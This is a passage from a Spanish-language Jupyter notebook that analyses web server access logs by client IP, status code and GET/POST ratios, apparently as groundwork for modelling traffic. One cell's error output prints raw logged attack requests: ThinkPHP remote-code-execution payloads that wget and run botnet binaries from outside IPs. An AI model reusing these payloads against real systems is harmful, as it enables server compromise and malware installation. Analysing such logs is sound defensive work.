           }
          },
          "title": {
           "x": 0.05
          },
          "xaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          },
          "yaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          }
         }
        },
        "title": {
         "text": "Distribución de los Status Code de los envios"
        },
        "xaxis": {
         "anchor": "y",
         "domain": [
          0,
          1
         ],
         "title": {
          "text": "Status Code"
         }
        },
        "yaxis": {
         "anchor": "x",
         "domain": [
          0,
          1
         ],
         "title": {
          "text": "count"
         }
        }
       }
      }
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "total_envios = envios_status['count'].sum()\n",
    "\n",
    "# Calcular el porcentaje de cada barra con dos decimales\n",
    "envios_status['porcentaje'] = (envios_status['count'] / total_envios * 100).round(2)\n",
    "\n",
    "# Crear el gráfico de barras\n",
    "fig = px.bar(envios_status, x='Status Code', y='count', color='Client IP', title='Distribución de los Status Code de los envios',\n",
    "             text=envios_status['porcentaje'].astype(str) + '%')  # Mostrar el porcentaje de cada barra con dos decimales como texto\n",
    "\n",
    "# Mostrar el gráfico\n",
    "fig.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Análisis de rutina no se puede hacer debido a que hay poca distribución temporal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Informacion general agrupada"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 104,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Solicitudes</th>\n",
       "      <th>Latencia_media</th>\n",
       "      <th>Tamano_promedio</th>\n",
       "      <th>Tamano_total</th>\n",
       "      <th>Tamano_enviado_prom</th>\n",
       "      <th>Tamano_recibido_prom</th>\n",
       "      <th>Agentes_unicos</th>\n",
       "      <th>Ratio_GET_POST</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>5378</td>\n",
       "      <td>0.204909</td>\n",
       "      <td>786.939011</td>\n",
       "      <td>4232158</td>\n",
       "      <td>713.339160</td>\n",
       "      <td>73.599851</td>\n",
       "      <td>1</td>\n",
       "      <td>15.496933</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>5667</td>\n",
       "      <td>0.303864</td>\n",
       "      <td>1277.646021</td>\n",
       "      <td>7240420</td>\n",
       "      <td>417.311629</td>\n",
       "      <td>860.334392</td>\n",
       "      <td>2</td>\n",
       "      <td>0.209089</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "       Client IP  Solicitudes  Latencia_media  Tamano_promedio  Tamano_total  \\\n",
       "0  192.168.4.164         5378        0.204909       786.939011       4232158   \n",
       "1   192.168.4.25         5667        0.303864      1277.646021       7240420   \n",
       "\n",
       "   Tamano_enviado_prom  Tamano_recibido_prom  Agentes_unicos  Ratio_GET_POST  \n",
       "0           713.339160             73.599851               1       15.496933  \n",
       "1           417.311629            860.334392               2        0.209089  "
      ]
     },
     "execution_count": 104,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df['Peticiones'] = df['Method'].apply(lambda x: 1 if x in ['GET', 'HEAD', 'NETSPARKER'] else 0)\n",
    "df['Envios'] = df['Method'].apply(lambda x: 0 if x in ['GET', 'HEAD', 'NETSPARKER'] else 1)\n",
    "\n",
    "df['Bytes Recibidos'] = df.apply(lambda row: row['Bytes Sent'] if row['Method'] in ['GET', 'HEAD', 'NETSPARKER'] else 0, axis=1)\n",
    "df['Bytes Enviados'] = df.apply(lambda row: 0 if row['Method'] in ['GET', 'HEAD', 'NETSPARKER'] else row['Bytes Sent'], axis=1)\n",
    "\n",
    "\n",
    "result = df.groupby('Client IP').agg(\n",
    "    Solicitudes=('Client IP', 'count'),\n",
    "    Latencia_media=('Latencia', 'mean'),\n",
    "    Tamano_promedio=('Bytes Sent', 'mean'),\n",
    "    Tamano_total=('Bytes Sent', 'sum'),\n",
    "    Tamano_enviado_prom=('Bytes Recibidos', 'mean'),\n",
    "    Tamano_recibido_prom=('Bytes Enviados', 'mean'),\n",
    "    Agentes_unicos=('User Agent', 'nunique'),\n",
    "    GET_total=('Peticiones', 'sum'),\n",
    "    POST_total=('Envios', 'sum')\n",
    ")\n",
    "\n",
    "result['Ratio_GET_POST'] = result['GET_total'] / result['POST_total']\n",
    "\n",
    "result = result.drop(columns=['GET_total', 'POST_total']).reset_index()\n",
    "\n",
    "result"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 3. Modelado"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Analisis sobre el IP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Utilizamos datos nuevos para entrenar con datos no afectados"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Error: Line does not match regex pattern: 178.47.232.191 - - [22/Jan/2019:04:54:22 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 188.19.139.184 - - [22/Jan/2019:06:06:53 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 42.112.163.67 - - [22/Jan/2019:06:36:36 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 74.82.60.74 - - [22/Jan/2019:08:27:26 +0330] \"\\x13BitTorrent protocol\\x00\\x00\\x00\\x00\\x00\\x18\\x00\\x05\\x7FI\\xE3\\x1Ao\\xC6\\x13\\x9D\\xCE\\xBB2\\xBD(\\x10w\\xC8\\x99\\xC1\\xC1\\xCC-UW0I2M-QuIQ4GIjrmt2\\x0F\\x8A\\x00\\xAD\\x96\\x97\\x96\\xAB\\x00\\x22**\\x13\\x01\\x13\\x02\\x13\\x03\\xC0+\\xC0/\\xC0,\\xC00\\xCC\\xA9\\xCC\\xA8\\xC0\\x13\\xC0\\x14\\x00\\x9C\\x00\\x9D\\x00/\\x005\\x00\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 80.82.64.127 - - [22/Jan/2019:08:40:11 +0330] \"\\x16\\x03\\x01\\x00\\x96\\x01\\x00\\x00\\x92\\x03\\x03\\xCB\\x077\\xE6\\x83Nq>\\xB5\\xED\\x9E\\x87\\xB7\\x08\\xD7\\xEAF\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 126.60.209.224 - - [22/Jan/2019:09:35:56 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 72.52.125.78 - - [22/Jan/2019:09:55:32 +0330] \"\\x17\\x10\\x05\\x15JL\\xAD\\xDC\\xCEL\\xC1Ff>F\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 119.93.85.191 - - [22/Jan/2019:10:55:41 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1\" 400 166 \"-\" \"Cayosin/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 146.52.111.201 - - [22/Jan/2019:11:07:41 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86' HTTP/1.1\" 400 166 \"-\" \"Cayosin/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 118.68.205.57 - - [22/Jan/2019:11:41:43 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 218.228.8.49 - - [22/Jan/2019:11:49:28 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 104.40.2.56 - - [22/Jan/2019:12:06:16 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 78.187.39.146 - - [22/Jan/2019:13:24:49 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 78.187.39.146 - - [22/Jan/2019:13:24:51 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 78.187.39.146 - - [22/Jan/2019:13:24:51 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 103.215.247.149 - - [22/Jan/2019:14:17:24 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 108.178.16.154 - - [22/Jan/2019:14:32:00 +0330] \"j\\x00\\xA7\\x00\\xF3\\x00H\\x00z\\x00\\xF3\\x00\\xFE\\x00\\xFB\\x00\\x8E\\x00\\xFE\\x00H\\x00\\x8E\\x00H\\x00\\xF3\\x00\\xA7\\x00\\xD9\\x00\\xA7\\x00\\xF3\\x00\\xB0\\x00H\\x00\\x8B\\x00\\xF3\\x00\\xC5\\x00\\xC5\\x00\\xFC\\x00\\x8E\\x00\\xFB\\x00\\xFC\\x00\\xEC\\x00\\x8B\\x00\\xF3\\x00\\xD9\\x00\\xA7\\x00\\xFB\\x00\\xFC\\x00\\xEC\\x00\\x8E\\x00\\xF3\\x00\\xFB\\x00\\xA7\\x00\\xC5\\x00\\xF3\\x00\\xEC\\x00\\x09\\x00\\x17\\x00\\xD9\\x00\\xFB\\x00z\\x00\\xD9\\x00\\xC5\\x00\\xC5\\x00z\\x00\\x17\\x00\\xA7\\x00\\x17\\x00\\x8B\\x00\\xF3\\x00\\x17\\x00\\xA7\\x00j\\x00j\\x00\\xC5\\x00\\x8E\\x00\\x09\\x00\\x09\\x00\\x09\\x00\\x17\\x00\\xFB\\x00\\x8B\\x00z\\x00H\\x00\\xFB\\x00\\x8E\\x00\\xA7\\x00\\x09\\x00\\x8B\\x00\\x8E\\x00z\\x00z\\x00\\xB0\\x00\\x17\\x00\\x8E\\x00\\xC5\\x00j\\x00\\xEC\\x00\\xFB\\x00\\xEC\\x00\\xC5\\x00\\x8E\\x00\\xB0\\x00\\xC5\\x00\\x17\\x00\\x17\\x00H\\x00\\xFB\\x00\\xB0\\x00\\xA7\\x00\\xA7\\x00\\xFB\\x00\\xB0\\x00\\x8E\\x00\\xC5\\x00\\xB0\\x00H\\x00\\x17\\x00\\xC5\\x00\\x8B\\x00j\\x00\\x8E\\x00\\xEC\\x00\\xF3\\x00\\xFE\\x00\\xD9\\x00\\xF3\\x00\\xA7\\x00j\\x00\\xEC\\x00\\xA7\\x00\\xB0\\x00\\x17\\x00\\xFC\\x00H\\x00H\\x00\\x09\\x00\\x09\\x00\\x09\\x00H\\x00\\x8E\\x00\\xCE\\x00\" 400 166 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 1.52.109.77 - - [22/Jan/2019:14:33:38 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 120.75.116.136 - - [22/Jan/2019:14:56:10 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 37.191.134.207 - - [22/Jan/2019:15:14:37 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 5.140.135.145 - - [22/Jan/2019:15:23:27 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86' HTTP/1.1\" 400 166 \"-\" \"Yowai/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 88.247.102.229 - - [22/Jan/2019:15:54:24 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 202.214.186.65 - - [22/Jan/2019:16:32:18 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 49.241.214.70 - - [22/Jan/2019:16:52:26 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 151.239.241.163 - - [22/Jan/2019:17:40:26 +0330] \"GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28790},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[60828,%2060829,%2061106]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[57679,%2058602,%2062570]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[987106,%20987121,%20992487,%201034825,%201043822,%201043964,%201050125,%201058377,%201059103,%201065069,%201069943,%201071346,%201077679,%201080951,%201081548,%201081592,%201085226,%201090300,%201090638,%201090765,%201090829,%201096423,%201098133,%201098263,%201098306,%201098365,%201098677,%201098896,%201098936,%201101429,%201103340,%201103766,%201124747,%201129667,%201138598,%201139716,%201151604,%201157578,%201173836,%201177646,%201177724,%201177802,%201177880,%201177958,%201184023,%201184100,%201184177,%201184254,%201185435,%201186836,%201188122,%201188190,%201188289,%201188356,%201188580,%201188646,%201188714,%201188779,%201188846,%201188910,%201188974,%201189040,%201189103,%201189168,%201189230,%201189294,%201189355,%201189418,%201189478,%201189540,%201189599,%201189660,%201189718,%201189776,%201189836,%201189893,%201189952,%201190008,%201190066,%201190121,%201190178,%201190234,%201190287,%201190605,%201190657,%201190710,%201190761,%201193820,%201194310,%201194382,%201195748,%201195816,%201197112,%201197190,%201199572,%201199677,%201201148,%201205466,%201205607,%201209126,%201212283,%201216427,%201217612,%201220301,%201227114,%201227566,%201227647,%201230545,%201230625,%201230705,%201231883,%201232726,%201235726,%201239597,%201244186,%201250215,%201253250,%201255769,%201258720,%201261082,%201269482,%201271604,%201281340,%201281957,%201281965,%201284378,%201284386,%201285873,%201297334,%201297427,%201297489,%201297577,%201300614,%201301456,%201305437,%201314325,%201319335,%201325872,%201336661,%201336680,%201337864,%201338817,%201354442,%201366685,%201367179,%201395027,%201395660,%201421565,%201432684,%201451797,%201470884,%201471379,%201496577,%201529070,%201539470,%201548769,%201556973,%201557020,%201566841,%201579049,%201592648,%201593169,%201593325,%201595980,%201597681,%201601112,%201601149,%201602202,%201610910,%201628256,%201645571,%201652851,%201664619,%201675378,%201688189,%201696659,%201697024,%201707067,%201709359,%201713472,%201728294,%201728702,%201735762,%201736761,%201736937,%201738206,%201738393,%201738396,%201738399,%201738403,%201742639,%201744324,%201744364,%201750336,%201750790,%201755206,%201763498,%201780188,%201786013,%201795468,%201797424,%201800533,%201800910,%201802304,%201802469,%201809758,%201821471,%201824569,%201824643,%201824852,%201824934,%201825015,%201825157,%201825619,%201825706,%201826386,%201826489,%201826591,%201826819,%201826922,%201827124,%201828346,%201829560,%201829784,%201829942,%201831483,%201831589,%201831694,%201831800,%201831905,%201832010,%201832116,%201832283,%201832663,%201832664,%201833024,%201833131,%201833132,%201833240,%201835488,%201836063,%201836231,%201836341,%201836493,%201837002,%201837175,%201837286,%201837287,%201837398,%201837399,%201837725,%201838724,%201842685,%201844939,%201849743,%201853086,%201853413,%201856027,%201857897,%201865492,%201873202,%201884294,%201897795,%201897832,%201899561,%201901452,%201907619,%201908878,%201908938,%201908998,%201909060,%201911987,%201912031,%201912955,%201915059,%201919815,%201930846,%201931495,%201931563,%201933015,%201937676,%201942542,%201953747,%201960558,%201960739,%201965157,%201031381,%201034826,%201043823,%201043965,%201050126,%201058378,%201059104,%201065070,%201069944,%201070655,%201071347,%201077680,%201080952,%201081549,%201081593,%201085227,%201090301,%201092161,%201092284,%201098366,%201101430,%201124748,%201129668,%201138599,%201139717,%201151605,%201157579,%201186837,%201191838,%201195750,%201195818,%201197113,%201197191,%201199573,%201199678,%201201149,%201205467,%201205608,%201209127,%201212284,%201216428,%201217613,%201220302,%201227115,%201227567,%201227648,%201230546,%201230626,%201230706,%201231884,%201232727,%201235727,%201239598,%201244187,%201250216,%201253251,%201255770,%201258721,%201261083,%201269483,%201271605,%201281958,%201281966,%201284379,%201284387,%201285874,%201286328,%201297335,%201297428,%201297490,%201297578,%201300615,%201301457,%201305438,%201314326,%201325873,%201334356,%201334493,%201334727,%201337865,%201340881,%201354443,%201366687,%201367181,%201395029,%201395662,%201421567,%201432686,%201451799,%201470886,%201471381,%201496579,%201529072,%201539472,%201548771,%201556975,%201557022,%201566843,%201579051,%201595982,%201597683,%201601114,%201601151,%201602204,%201610912,%201628258,%201645573,%201652853,%201664621,%201675380,%201688191,%201709363,%201713474,%201763500,%201780190,%201786017,%201797426,%201802306,%201809760,%201849745,%201853088,%201857899,%201865494,%201873204,%201884296,%201901454,%201907621,%201919817,%201931657,%201932158,%201955188,%201965159,%201282274,%201285875,%201297336,%201297429,%201297492,%201297579,%201300616,%201301458,%201305439,%201314327,%201336662,%201336706,%201337866,%201338818,%201350826,%201354444,%201366689,%201367183,%201395031,%201395664,%201421569,%201432688,%201451801,%201470888,%201471383,%201496581,%201529074,%201539474,%201548773,%201556977,%201557024,%201566845,%201579053,%201592650,%201593173,%201593329,%201595984,%201597685,%201601116,%201601153,%201602206,%201610914,%201628260,%201645575,%201652855,%201664623,%201675382,%201688193,%201709365,%201713476,%201744326,%201744366,%201746850,%201746867,%201746884,%201755658,%201759624,%201763502,%201780192,%201786019,%201802308,%201809762,%201821473,%201833376,%201838726,%201842687,%201844941,%201849747,%201853090,%201857901,%201866924,%201897797,%201897834,%201901603,%201901682,%201901762,%201901\" 414 186 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 91.99.30.32 - - [22/Jan/2019:17:55:40 +0330] \"GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:9103},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[23228,%2061448,%2061449,%2061450,%2061461]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[15503,%2015504]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20